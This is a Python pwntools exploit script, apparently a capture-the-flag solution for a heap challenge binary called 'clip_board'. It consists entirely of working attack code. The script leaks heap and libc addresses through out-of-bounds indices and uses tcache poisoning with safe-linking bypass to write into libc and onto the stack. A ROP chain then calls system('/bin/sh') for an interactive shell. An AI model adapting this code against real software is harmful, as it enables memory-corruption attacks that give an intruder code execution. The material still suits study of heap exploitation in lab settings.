#!/usr/bin/env python2
from pwn import *
libc = ELF("./libc.so.6")
context.arch = "amd64"
context.terminal = "tmux split -h".split()
p = process("./clip_board", env={"LD_PRELOAD":"./libc.so.6"})
context.terminal = "tmux split -h".split(" ")

def add(idx, size, contents):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", str(size))
    p.sendlineafter("> ", contents)
    
def delete(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("> ", str(idx))
    
def view(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("> ", str(idx))

heap = int(p.recvline().strip().split(b": ")[1], 16) - 0x2a0
print ("heap", hex(heap))

add(-8, 255, cyclic(100))

add(1, 255, ''.join([
    "A" * 0x10,
    p64(0), p64(0x111),
    "B" * 0x90
]))
add(9, 255, "CCCCCCCCCCC")
view(-4) 

data = p.recvline()
libc_base = u64(data[8:16]) - 0x21a803
print ("libc", hex(libc_base))


delete(-8) # 0x4f0 -> 0x400
delete(9)
delete(1)

gdb.attach(p)
add(2, 255, ''.join([
    "A" * 0x18,
    p64(0x111),
    p64(((heap + 0x400) >> 12 ) ^ (libc_base + 0x221200 - 0x10))
]))

add(3, 255, "XYZ")
add(4, 255, "")
view(4)
dump = p.recvline()
environ = u64(dump[16:24])
print "environ", hex(environ)
rop = environ - 0x140
print "rop", hex(rop)

add(-8, 200, cyclic(100))
add(1, 200, ''.join([
    cyclic(0x8 * 4),
    p64(0), p64(0xd1),
    "ZZZZZZZZZZZZZZ"
]))
add(9, 200, "WWWW")
delete(-8)
delete(9)
delete(1)
add(1, 200, ''.join([
    "X" * 0x30,
    p64(((heap + 0x400) >> 12 ) ^ (rop - 8))
]))
add(5, 200, "ZZZ")

rdi_r = libc_base + 0x2aad3
add(6, 200, ''.join([
    "A" * 8,
    p64(rdi_r + 1),
    p64(rdi_r),
    p64(libc_base + libc.search("/bin/sh\x00").next()),
    p64(libc_base + libc.symbols['system'])
]))

p.interactive()

"""
0x2aad3: pop rdi ; ret ; (1 found)
"""
